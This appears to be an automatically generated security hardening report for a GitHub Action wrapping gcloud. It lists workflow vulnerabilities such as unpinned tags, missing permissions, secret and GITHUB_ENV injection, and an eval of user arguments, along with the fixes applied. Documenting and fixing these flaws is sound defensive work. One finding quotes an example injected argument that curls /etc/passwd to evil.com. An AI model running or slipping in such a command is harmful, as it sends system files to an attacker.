<!-- markdownlint-disable -->

# Hardening Report: actions-hub--gcloud/579.0.0

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **actions-hub--gcloud/579.0.0** was hardened automatically. 5 finding(s) were identified and resolved across 2 iteration(s).

## Findings Fixed

### unpinned-uses (severity: high)

Workflow files reference actions by mutable version tags instead of full 40-character commit SHAs. In test.yaml, `actions/checkout@v2` is used in all four jobs (lines 9, 21, 31, 44). In upgrader.yaml, `actions/create-release@v1` is used (line 89). These tags can be moved to point to different (potentially malicious) commits at any time, enabling supply-chain attacks.

Locations:

- `.github/workflows/test.yaml:9`
- `.github/workflows/test.yaml:21`
- `.github/workflows/test.yaml:31`
- `.github/workflows/test.yaml:44`
- `.github/workflows/upgrader.yaml:89`

### permissions (severity: medium)

Neither workflow file defines a `permissions:` key at the top level or at the job level. Without explicit permissions, workflows run with the default (often broad) token permissions. Both test.yaml and upgrader.yaml are missing permissions declarations entirely.

Locations:

- `.github/workflows/test.yaml:1`
- `.github/workflows/upgrader.yaml:1`

### script-injection (severity: high)

Sub-rule (a): `${{ secrets.GH_TOKEN }}` is interpolated directly inside `run:` shell command strings in upgrader.yaml. The expression is expanded by the GitHub Actions template engine before the shell sees the string, meaning any special characters in the secret value (newlines, shell metacharacters) are injected raw into the shell command. Offending lines: `git config --global url."https://${{ secrets.GH_TOKEN }}:@github.com/".insteadOf "https://github.com/"` — appears in both the 'Checkout repo' step (~line 12) and the 'Modify Dockerfile' step (~line 68).

Locations:

- `.github/workflows/upgrader.yaml:12`
- `.github/workflows/upgrader.yaml:68`

### github-env-injection (severity: high)

In upgrader.yaml, the 'Check if new version exist' step writes `SDK_VERSION` and `LATEST_VERSION` — values derived from external curl responses (Docker Hub and GitHub API, i.e. untrusted network data) — directly to `$GITHUB_ENV` and `$GITHUB_OUTPUT` without the required sanitization step (`printf '%s' ... | tr -d '\n\r'`). A malicious response from either API could inject newlines to poison the environment file. Offending lines: `echo "SDK_VERSION=${SDK_VERSION}" >> $GITHUB_ENV`, `echo "LATEST_VERSION=${LATEST_VERSION}" >> $GITHUB_ENV`, `echo "newest=yes" >> $GITHUB_OUTPUT`. Similarly, the 'Modify Dockerfile' step writes `echo "tag=${SDK_VERSION}" >> $GITHUB_OUTPUT` without sanitization.

Locations:

- `.github/workflows/upgrader.yaml:30`
- `.github/workflows/upgrader.yaml:31`
- `.github/workflows/upgrader.yaml:29`
- `.github/workflows/upgrader.yaml:83`

### suspicious-run-content (severity: high)

Sub-check `eval-dynamic`: entrypoint.sh uses `eval "$command $*"` at the end of the script, where `$*` expands to all positional arguments passed to the Docker entrypoint — which are directly sourced from the action's `args` input (user-controlled). This allows an attacker to inject arbitrary shell commands via the `args` input (e.g., `args: 'info; curl -d @/etc/passwd http://evil.com'`). The pattern matches `eval` with a variable/shell-expansion argument.

Locations:

- `entrypoint.sh:76`

## Iteration Notes

### Iteration 1

**Fixes applied:** unpinned-uses, permissions, script-injection, github-env-injection, suspicious-run-content

**Notes:**

Fixed all 5 findings:
1. unpinned-uses: Pinned actions/checkout@v2 → @0717577d45739eb3c851188b29f50ed6c0b2194e in test.yaml (4 locations) and actions/create-release@v1 → @0cb9c9b65d5d1901c1f53e5e66eaf4afd303e70e in upgrader.yaml.
2. permissions: Added `permissions: {}` to test.yaml and `permissions: contents: write` to upgrader.yaml.
3. script-injection: Moved ${{ secrets.GH_TOKEN }} from run: shell strings into env: blocks (as GH_TOKEN) in both 'Checkout repo' and 'Modify Dockerfile' steps in upgrader.yaml.
4. github-env-injection: Added `printf '%s' "$VAR" | tr -d '\n\r'` sanitization before writing SDK_VERSION, LATEST_VERSION to $GITHUB_ENV and tag to $GITHUB_OUTPUT in upgrader.yaml.
5. suspicious-run-content: Replaced `eval "$command $*"` in entrypoint.sh with a safe xargs-based array tokenization approach followed by `"$command" "${args[@]}"` to prevent shell injection via user-controlled args.

### Iteration 2

**Fixes applied:** script-injection

**Notes:**

Fixed two script-injection findings in .github/workflows/upgrader.yaml: (1) In the 'Check if version tag is semver and if docker hub has it' step: quoted $SDK_VERSION in the bash [[ ]] regex test (was unquoted, now "$SDK_VERSION") and quoted the curl URL string (was unquoted bare URL, now double-quoted string containing $SDK_VERSION). (2) In the 'Modify Dockerfile' step: $LATEST_VERSION and $SDK_VERSION are now properly enclosed in double-quoted strings for FROM_LINE, TO_LINE assignments, the sed command's Dockerfile path argument, and the git commit message. The variables were already sanitized (newlines stripped via tr -d) before being written to $GITHUB_ENV in the prior step, and are now also properly quoted at point of use.

